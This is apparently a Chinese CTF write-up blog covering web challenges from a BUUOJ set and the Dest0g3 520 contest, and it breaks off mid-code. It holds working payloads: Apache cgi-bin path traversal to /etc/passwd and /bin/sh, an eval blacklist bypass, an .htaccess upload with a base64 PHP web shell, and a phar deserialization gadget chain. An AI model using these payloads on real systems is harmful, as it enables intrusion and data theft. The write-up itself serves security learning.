<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">文件读取</span><br><span class="line">GET:</span><br><span class="line">/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh</span><br><span class="line"></span><br><span class="line">根目录的flag是假的，可以用find命令找找</span><br><span class="line"></span><br><span class="line">echo;find / -name *fl*</span><br><span class="line"></span><br><span class="line">/diajgk/djflgak/qweqr/eigopl/fffffflalllallalagggggggggg</span><br><span class="line">/flag</span><br><span class="line"></span><br><span class="line">同理可以找la,ag</span><br><span class="line"></span><br><span class="line">最后在根目录一个奇怪文件夹里面找到flag(又是套题</span><br><span class="line"></span><br><span class="line">POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1</span><br><span class="line">Host: node4.buuoj.cn:25202</span><br><span class="line">Content-Length: 65</span><br><span class="line"></span><br><span class="line">echo;cat /diajgk/djflgak/qweqr/eigopl/fffffflalllallalagggggggggg</span><br></pre></td></tr></table></figure>


<h3 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h3><p>go语言的命令执行基础</p>
<p>第一次发.go，第二次去掉后缀再发一次，最后再选择访问<code>/shortcuts?alias=filename</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    cmd := exec.Command(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    out, err := cmd.CombinedOutput()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">        log.Fatalf(<span class="string">&quot;cmd.Run() failed with %s\n&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    cmd := exec.Command(<span class="string">&quot;cat&quot;</span>,<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">    out, err := cmd.CombinedOutput()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">        log.Fatalf(<span class="string">&quot;cmd.Run() failed with %s\n&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Dest0g3-520迎新赛"><a href="#Dest0g3-520迎新赛" class="headerlink" title="Dest0g3 520迎新赛"></a>Dest0g3 520迎新赛</h1><p>520，闲着也是闲着，不如打打简单题放松一下</p>
<h2 id="web-5"><a href="#web-5" class="headerlink" title="web"></a>web</h2><h3 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h3><p>好像是个简单题，哦想起来了，老知识点，文件包含不能二次包含，但可以绕</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjEzMjM1">知识点链接</span></p>
<p>这里是需要利用伪协议配合多级符号链接绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h3 id="EasyPHP-1"><a href="#EasyPHP-1" class="headerlink" title="EasyPHP"></a>EasyPHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;fl4g.php&quot;</span>;</span><br><span class="line"><span class="variable">$dest0g3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;H&quot;</span>);</span><br><span class="line"><span class="variable">$timme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="variable">$timmme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$time</span> &gt; <span class="string">&quot;24&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timme</span> &gt; <span class="string">&quot;31&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timmme</span> &gt; <span class="string">&quot;60&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="keyword">use</span>(<span class="params">&amp;<span class="variable">$fl4g</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$fl4g</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$fl4g</span> .= <span class="variable">$dest0g3</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>有个自定义报错函数：<code>set_error_handler</code></p>
<p>下面有个字符串拼接:<code>$fl4g .= $dest0g3;</code></p>
<p>直接传数组使之拼接错误，然后报错获得</p>
<h3 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$aaa</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;pastre&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;pcre&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;diff&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;sort&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;cut&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;vi&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$black_list</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用原生类查到flag在根目录下：</p>
<blockquote>
<p>aaa&#x3D;echo(new GlobIterator(‘&#x2F;f*’));</p>
</blockquote>
<p>然后使用逆序绕过，并且使用show_source打印出flag</p>
<blockquote>
<p>aaa&#x3D;show_source(strrev(‘galf&#x2F;‘));</p>
</blockquote>
<p>当然require也行，ban的挺少</p>
<h3 id="funny-upload"><a href="#funny-upload" class="headerlink" title="funny_upload"></a>funny_upload</h3><p>啥苟muhua来咯</p>
<p>人不行偏怪路不平，诶，就那个纯纯的啥笔</p>
<p>文件上传，前端检测使用抓包发送绕过，后端拦截了文件后缀<code>ph</code>，使用的是Apache，所以考虑可以上传<code>.htaccess</code>，进行文件配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .abc</span><br><span class="line">php_value auto_append_file php://filter/convert.base64-decode/resource=1.abc</span><br></pre></td></tr></table></figure>

<p>然后上传一个马<code>1.abc</code>，内容是base64编码的马：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#&lt;?php eval($_POST[1]);</span></span><br><span class="line"></span><br><span class="line">PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</span><br></pre></td></tr></table></figure>
<p>打开1.abc文件，post传入</p>
<blockquote>
<p>1&#x3D;phpinfo();</p>
</blockquote>
<p>禁用了命令执行，但可以使用php函数查看目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&quot;/flag&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="pharpop"><a href="#pharpop" class="headerlink" title="pharpop"></a>pharpop</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Cannot transfer arrays&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;You can&#x27;t do&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">air</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$p</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p-&gt;act;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$p</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tree</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$act</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">name</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$arg</span>[<span class="number">1</span>] =<span class="variable language_">$this</span>-&gt;name-&gt;<span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">apple</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$flag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;xxx-&gt;<span class="variable">$flag</span> = <span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;start == <span class="string">&#x27;w&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="variable">$filename</span> = <span class="string">&quot;/tmp/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;start == <span class="string">&#x27;r&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="variable">$f</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;It is file&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;You can look at the others&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">banana</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag in /</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]) &lt; <span class="number">55</span>) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;str too long&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;start&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<!-- 一个gc回收机制给我复现麻了，还是见识少了 -->
<p>链子不算难，上传然后打phar就行，waf直接压缩就行，关键就在于代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;start&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>会导致正常反序列化无法触发到析构方法<code>__destruct</code><br>利用gc垃圾回收机制：<span class="exturl" data-url="aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZmVhdHVyZXMuZ2MuY29sbGVjdGluZy1jeWNsZXMucGhw">回收周期(Collecting Cycles)</span></p>
<p>先构造上传&#x2F;触发链子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">D</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start = <span class="string">&#x27;w&#x27;</span>;</span><br><span class="line"><span class="comment">// $a-&gt;start = &#x27;r&#x27;;</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="variable">$a</span>,<span class="number">1</span>=&gt;<span class="literal">NULL</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(i:1;)/&#x27;</span>,<span class="string">&#x27;i:0;&#x27;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>

<p>接着构造利用链：<br><code>__destruct</code>方法中:</p>
<blockquote>
<p>return $this-&gt;name();<br>调用一个<code>tree类</code>中名为<code>name</code>的方法，因为<code>tree类</code>中不存在该方法，触发<code>tree类</code>中的<code>__call</code>方法</p>
</blockquote>
<p>给<code>tree类</code>中的<code>name属性</code>赋值为<code>apple对象</code>： </p>
<blockquote>
<p>$this-&gt;name-&gt;$name;<br><code>apple类</code>中不存在<code>name属性</code>，触发<code>__get</code>方法：<br>$this-&gt;xxx-&gt;$flag &#x3D; $this-&gt;flag;<br>给<code>xxx属性</code>赋值为<code>air对象</code><br>此时<code>air类</code>中不存在<code>flag属性</code>，赋值这个行为触发<code>__set</code>方法：<br>$p &#x3D; $this-&gt;p-&gt;act;<br>将<code>p属性</code>赋值为<code>tree对象</code>，此时：<br>echo new $p($value);<br><code>$p</code>和<code>$value</code>都可控，使用原生类直接进行文件查找与访问既可</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">air</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tree</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$act</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">apple</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">banana</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">tree</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="keyword">new</span> <span class="title class_">apple</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;xxx = <span class="keyword">new</span> <span class="title class_">air</span>();</span><br><span class="line"><span class="comment">// $a-&gt;name-&gt;xxx-&gt;p = new banana();</span></span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;xxx-&gt;p = <span class="keyword">new</span> <span class="title class_">tree</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;xxx-&gt;p-&gt;act = <span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;flag = <span class="string">&quot;/fflaggg&quot;</span>;</span><br><span class="line"><span class="comment">// $a-&gt;name-&gt;xxx-&gt;p-&gt;act = &quot;GlobIterator&quot;;</span></span><br><span class="line"><span class="comment">// $a-&gt;name-&gt;flag = &quot;/f*&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar1.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="variable">$a</span>,<span class="number">1</span>=&gt;<span class="literal">NULL</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span 